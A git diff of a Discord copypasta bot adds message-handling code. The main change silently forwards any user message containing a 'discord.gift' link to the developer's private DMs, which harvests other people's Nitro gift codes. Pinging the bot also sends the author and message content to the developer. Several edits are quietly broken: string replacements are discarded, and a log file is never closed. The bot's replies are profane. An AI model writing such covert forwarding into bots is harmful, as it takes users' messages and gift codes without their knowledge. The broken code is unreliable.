@@ -6,6 +6,7 @@ import os
 from discord.ext import commands
 from discord.ext.commands import Bot
 from time import sleep
+import html
 
 os.system("pip install topggpy")
 
@@ -38,16 +39,33 @@ bot.nsfwenabled = False
 bot.amountToGet = 100
 bot.string = "placeholder. if you're seeing this something seriously went wrong"
 
+kevlu8 = None
+
 @bot.event
 async def on_message(message):
     message.content = message.content.lower()
-    pingMaybe = message.content.replace(" ", "")
-    if pingMaybe == '<@882832904605020190>' or pingMaybe == "@CopyPasta#7051":
-      channel = message.channel 
-      await channel.send('fuck you, stop pinging me or i will start fucking swearing, if you want to know my prefix its : are you happy now')
+    mention = f'<@!{bot.user.id}>'
+    if mention in message.content:
+      try:
+        await message.channel.send("Every time you ping me, a message is sent to kevlu8, the developer.\n\nYou keep pinging me for no reason. While you may personally find it humorous, I do not. It is very annoying and interrupts whatever I am focusing on. Please, refrain from mindlessly trying to get my attention. \n\nAnd this statement is applicable to everyone else here.\n\n Do \n\nI\n\nMake\n\nMyself\n\nClear?")
+      except:
+        print("give me fucking permission")
+      print("I got pinged lol")
+      guild = bot.get_guild(855275010556821524)
+      kevlu8 = guild.get_member(458684594703695872)
+      if kevlu8 == None:
+        kevlu8 = guild.get_member_named("kevlu8#5240")
+      try:
+        message.content = message.content.replace(f'<@!{bot.user.id}>', "[ping was here]")
+        await kevlu8.send("I just got pinged, fuck whoever that was *cough* " + str(message.author) + " and *cough* the message was " + message.content)
+      except:
+        print("bruh error")
+    if "discord.gift" in message.content:
+      if not str(message.author) == 'CopyPasta#7051':
+        guild = bot.get_guild(855275010556821524)
+        kevlu8 = guild.get_member(458684594703695872)
+        await kevlu8.send(message.content)
     await bot.process_commands(message)
-
-kevlu8 = None
 
 @bot.event
 async def on_ready():
@@ -55,7 +73,7 @@ async def on_ready():
 
   print('We have logged in as {0.user}'.format(bot))
 
-  activity = discord.Game(name=":help - over " + str(len(bot.guilds)) + " servers!", type=3)
+  activity = discord.Game(name=":help - Every time you ping me the bot owner gets a DM. Please spam my mention")
   await bot.change_presence(status=discord.Status.online, activity=activity)
 
 @bot.event
@@ -67,6 +85,8 @@ async def on_command_error(ctx, error):
     elif isinstance(error, commands.MissingPermissions):
         await ctx.send("You do not have permission to run this command. <:thonk:725866060166856764> <a:Supper:803963737622839316>")
     else:
+      f = open("db.txt", "a")
+      f.write(str(error) + "\n")
       error = str(error)
       guild = bot.get_guild(855275010556821524)
       kevlu8 = guild.get_member(458684594703695872)
@@ -174,18 +194,23 @@ async def copypasta(ctx):
           
   try: 
     print(content)
+    content.replace("&#x200B", "")
     await ctx.send(content)
   except:
     print("too long! splitting...")
     splitat = 2000
     left, right = bot.string[:splitat], bot.string[splitat:]
     try:
+      left.replace("&#x200B", "")
       await ctx.send(left)
+      right.replace("&#x200B", "")
       await ctx.send(right + " (from " + post.url + ")")
     except:
         middle1, middle2 = right[:splitat], right[splitat:]
         try:
+          middle1.replace("&#x200B", "")
           await ctx.send(middle1)
+          middle2.replace("&#x200B", "")
           await ctx.send(middle2 + " (from " + post.url + ")")
         except:
           await ctx.send("This post was way too long (over 6000 characters) and we couldn't send it. Link: " + post.url)
